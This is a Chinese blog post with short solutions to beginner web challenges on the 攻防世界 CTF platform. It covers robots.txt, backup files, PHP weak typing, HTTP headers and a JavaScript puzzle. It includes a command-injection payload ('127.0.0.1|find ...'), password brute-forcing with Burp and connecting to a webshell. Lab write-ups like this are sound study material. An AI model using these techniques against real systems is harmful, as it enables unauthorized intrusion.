    <content type="html"><![CDATA[<p>   进入攻防世界的学习</p><span id="more"></span><h3 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h3><p>f12查看源码就有flag。</p><h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h2><p>robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。<br>当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；<br>如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。<br>扫目录脚本dirsearch(项目地址：<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a>)<br>还有要用python3以上的版本。</p><p><img src="%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C.md/1.png"></p><p>不用一分钟，就发现了一个robot.txt文件，访问，获得flag路径，再次访问，获得flag。</p><h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><p>常见的备份文件后缀名有: .git .svn .swp .svn .~ .bak .bash_history<br>用扫目录脚本(同robots题目)，发现有备份文件即可找回。</p><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>刷新页面，发现有一个cookie.php，访问，查看http 响应就有flag。</p><h2 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h2><p>初步了解前端知识，f12审查元素，删除字段disabled=””即可，绕过前端验证和upload第一关的方法类似。</p><h3 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h3><p>弱口令密码爆破，使用burp进行爆破即可。</p><h3 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h3><p>原理—php弱类型比较</p><p>审计代码，发现flag由flag1和flag2组成，先对第一个if语句分析，</p><p><img src="%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C.md/2.png"></p><p>a==0 并且$a的值要存在，才能返回true 执行echo $flag1</p><p>由于php弱类型比较，所以令a=a时,a==0返回true，且$a返回true，如果令a=0，则会导致$a返回false。</p><p>第二个if语句，is_numeric检测变量是否为数字或数字字符串，是返回true，不是返回false</p><p>在字符串与数字进行比较时，会转化成同类型再比较(php弱类型比较，较不严格)，会使b=1235a转化成1235再与1234进行比较。</p><p>可以参考文章<a href="https://www.php.net/manual/zh/types.comparisons.php">https://www.php.net/manual/zh/types.comparisons.php</a></p><h3 id="get-post"><a href="#get-post" class="headerlink" title="get post"></a>get post</h3><p>使用hackbar进行post方式提交参数，在url进行get方式提交参数。</p><h3 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h3><p>必须要知道消息报头的一些知识。</p><h4 id="HTTP请求报文–消息报头"><a href="#HTTP请求报文–消息报头" class="headerlink" title="HTTP请求报文–消息报头"></a>HTTP请求报文–消息报头</h4><p><strong>Accept-Language:浏览器可接受的语言。</strong><br><strong>Cookie(小饼干):HTTP请求发送时，会把在该请求域名下的所有cookie值一起发送给web服务器。就像我们在网页登陆时，账户已经存在。</strong><br><strong>Content-Length:请求的内容长度。</strong><br><strong>Content-TyPe:请求的内容对应的MIME信息，也叫互联网媒体类型</strong><br><strong>Host:指定请求的服务器的域名和端口号。</strong><br><strong>User-Agent:User-Agent的内容包含发出请求的用户信息。</strong><br><strong>Referer:表示当前是从哪个页面上的链接触发的。</strong><br><strong>X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项<br>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的。</strong></p><p>使用burp先添加ip地址，再添加refer值。</p><h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>使用蚁剑连接一句话木马即可。</p><h3 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h3><p>这是一道简单有关ping命令执行恶意代码题，没有任何过滤机制。</p><p>直接ip地址接命令执行语句。</p><p>随便使用一个拼接符执行命令即可，这里有关命令执行的语句可以回看dvwa靶场的命令执行。</p><p><code>127.0.0.1|find -name &quot;flag.txt&quot;</code></p><p>这里找不到文件的时候，需要一级一级访问目录寻找flag。</p><h3 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h3><p>这是一题有关javascript的代码审计。</p><p><img src="%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C.md/3.png"></p><p>看到最后一句不管输入什么密码，都会跳出假密码，真密码位于fromCharCode。</p><p>编码为base16，先使用python处理获得数组，再将数组分别进行ascii处理。</p><p><img src="%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C.md/4.png"></p><p><img src="%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C.md/5.png"></p><p>获得的为flag的内容。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;   进入攻防世界的学习&lt;/p&gt;</summary>
    
    
    
    
    <category term="攻防世界" scheme="http://example.com/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
  </entry>
  
</feed>
